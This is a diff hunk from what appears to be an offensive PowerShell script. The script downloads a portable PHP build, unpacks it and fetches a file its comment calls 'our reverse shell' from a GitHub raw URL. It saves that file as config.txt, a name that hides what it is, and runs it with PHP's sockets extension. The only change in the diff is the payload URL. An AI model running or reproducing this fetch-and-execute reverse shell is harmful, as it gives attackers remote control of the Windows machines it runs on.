@@ -26,7 +26,7 @@ wget https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x86.zi
 Expand-Archive -Path $Env:temp\\php.zip -DestinationPath C:\\php
 
 # Download our reverse shell
-wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/readme.txt -O C:\\php\\config.txt
+wget https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/php.txt -O C:\\php\\config.txt
 
 # Run php with required sockets extention for reverse shell
 & "C:\\php\\php.exe" @('-d extension=sockets') @('C:\php\config.txt')
